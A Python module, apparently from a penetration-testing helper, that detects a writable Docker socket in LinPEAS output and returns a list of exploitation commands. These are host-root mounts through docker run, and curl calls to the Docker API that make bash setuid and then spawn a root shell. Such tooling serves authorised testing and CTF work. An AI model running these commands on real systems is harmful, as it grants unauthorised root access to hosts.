"""Detect writable /var/run/docker.sock from LinPEAS output."""

import re
from typing import Dict, List

_DOCKER_SOCK = "/var/run/docker.sock"

# Indicators that the socket is writable
_WRITABLE_PATTERNS = [
    re.compile(r"Read\s+Write", re.IGNORECASE),
    re.compile(r"\bwritable\b", re.IGNORECASE),
    re.compile(r"srw-rw-rw-"),          # world-writable unix socket perms
    re.compile(r"srwxrwxrwx"),
    re.compile(r"High\s+risk.*writable", re.IGNORECASE),
]

# How many lines after the docker.sock line to scan for writable indicators
_WINDOW = 5


def parse_docker_sock_section(section_text: str) -> bool:
    """Return True if /var/run/docker.sock appears writable in the section text."""
    lines = section_text.splitlines()
    for i, line in enumerate(lines):
        if _DOCKER_SOCK not in line:
            continue
        # Check this line and the next _WINDOW lines together
        window_text = "\n".join(lines[i: i + _WINDOW + 1])
        for pattern in _WRITABLE_PATTERNS:
            if pattern.search(window_text):
                return True
    return False


def generate_commands() -> List[str]:
    """Generate docker.sock exploitation steps (CLI and curl fallback)."""
    return [
        "# Method 1 — docker CLI (if available):",
        "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
        "# Method 2 — curl (no docker CLI needed):",
        "curl -s --unix-socket /var/run/docker.sock http://localhost/images/json | python3 -m json.tool | grep RepoTags",
        (
            "curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/create"
            " -H 'Content-Type: application/json'"
            " -d '{\"Image\":\"alpine\",\"Cmd\":[\"/bin/sh\",\"-c\",\"chmod +s /mnt/bin/bash\"],"
            "\"HostConfig\":{\"Binds\":[\"/:/mnt\"]}}'"
        ),
        "# Use container ID from above output, then start it:",
        "curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/<ID>/start",
        "/bin/bash -p",
    ]


def analyze(section_text: str) -> List[Dict]:
    """Analyze LinPEAS output for a writable /var/run/docker.sock.

    Returns a single CRITICAL finding when the socket is found writable.
    Note: docker group membership is handled separately by groups.py.
    """
    if not parse_docker_sock_section(section_text):
        return []
    return [{
        "severity": "CRITICAL",
        "type": "docker_sock",
        "commands": generate_commands(),
    }]


# ── CLI self-test ──────────────────────────────────────────────────────────────

if __name__ == "__main__":
    SAMPLES = {
        "unix socket Read Write Execute": """
╔══════════╣ Unix Sockets Analysis
/var/run/docker.sock
  └─(Read Write Execute )
  └─(Owned by root)
  └─High risk: root-owned and writable Unix socket
""",
        "interesting files (writable)": """
╔══════════╣ Interesting writable files owned by me or writable by everyone
/var/run/docker.sock (writable)
/tmp/somefile
""",
        "world-writable perms": """
srw-rw-rw- 1 root docker 0 Jan 10 /var/run/docker.sock
""",
        "not writable (read-only)": """
/var/run/docker.sock
  └─(Read )
  └─(Owned by root)
""",
    }

    for label, text in SAMPLES.items():
        findings = analyze(text)
        print(f"=== {label} ===")
        if findings:
            f = findings[0]
            cmds = f["commands"]
            print(f"[{f['severity']}] {f['type']}  ({len(cmds)} cmd(s))")
            print(f"  TRY FIRST: $ {cmds[1]}")
        else:
            print("  (no finding)")
        print()
